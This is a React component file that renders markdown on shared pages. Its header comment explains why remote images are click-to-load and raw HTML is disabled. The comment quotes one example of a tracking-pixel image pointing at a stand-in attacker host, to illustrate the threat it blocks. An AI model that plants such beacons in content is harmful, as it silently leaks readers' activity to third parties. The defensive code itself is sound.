'use client';

/**
 * Markdown for a shared page — the same renderer as everywhere else, with one
 * difference that only matters here.
 *
 * ## Remote images are click-to-load
 *
 * The deployment CSP allows `img-src https:`, so `![](https://attacker/x?t=…)`
 * in a note fires the moment the page renders. On the owner's own surfaces that
 * is mostly self-inflicted — it is their note. **On a shared page it is not.**
 * A note that arrived from an untrusted source (a vault sync from someone
 * else's repo, a pasted document) can carry a tracking pixel, and every person
 * the owner shares the page with silently pings a third party. The reader never
 * agreed to that and cannot see it happening.
 *
 * So a remote image renders as a placeholder the reader can choose to load.
 * Same-origin and `data:` images render normally: those cannot phone anywhere.
 *
 * Tightening `img-src` globally would be the other fix and it is worse — it
 * would break every legitimate image on the owner's own surfaces to close a
 * hole that only exists on this one.
 *
 * ## No raw HTML, ever
 *
 * `remark-gfm` is a parser-level extension: tables, task lists, strikethrough,
 * autolinks. It does **not** permit raw HTML, so a `<script>` in the source
 * renders as inert text. Do NOT add `rehype-raw` or `allowDangerousHtml` here —
 * on a page whose whole premise is rendering someone else's prose to strangers,
 * that would turn a note into an XSS sink.
 */

import { useState } from 'react';
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

import { MARKDOWN_BLOCK_CLASSES } from '@/components/admin/orchestration/markdown-or-raw-view';
import { Button } from '@/components/ui/button';
import { cn } from '@/lib/utils';

/** Can this src reach a third party if the browser fetches it automatically? */
function isRemote(src: string | undefined): boolean {
  if (!src) return false;
  return /^https?:\/\//i.test(src);
}

function DeferredImage({ src, alt }: { src?: string; alt?: string }): React.ReactElement {
  const [loaded, setLoaded] = useState(false);

  if (!isRemote(src)) {
    // Same-origin or a data URI. Nothing to defer — a plain <img> rather than
    // next/image because the source is arbitrary markdown, not a known asset.
    // eslint-disable-next-line @next/next/no-img-element
    return <img src={src} alt={alt ?? ''} className="max-w-full rounded" />;
  }

  if (loaded) {
    // eslint-disable-next-line @next/next/no-img-element
    return <img src={src} alt={alt ?? ''} className="max-w-full rounded" />;
  }

  let host = 'another site';
  try {
    host = new URL(src as string).host;
  } catch {
    // A src that does not parse is not one worth naming. The placeholder still
    // renders, and the reader still gets the choice.
  }

  return (
    <span className="border-border bg-muted/40 my-2 flex flex-col items-start gap-2 rounded border border-dashed p-3 text-sm">
      <span className="text-muted-foreground">
        {alt ? `Image: ${alt}` : 'Image'} — hosted by <span className="font-medium">{host}</span>.
        Loading it tells that site you opened this page.
      </span>
      <Button type="button" size="sm" variant="secondary" onClick={() => setLoaded(true)}>
        Load image
      </Button>
    </span>
  );
}

export function SharedMarkdown({
  content,
  className,
}: {
  content: string;
  className?: string;
}): React.ReactElement {
  return (
    <div className={cn(MARKDOWN_BLOCK_CLASSES, className)}>
      <Markdown
        remarkPlugins={[remarkGfm]}
        components={{
          img: ({ src, alt }) => (
            <DeferredImage src={typeof src === 'string' ? src : undefined} alt={alt} />
          ),
        }}
      >
        {content}
      </Markdown>
    </div>
  );
}
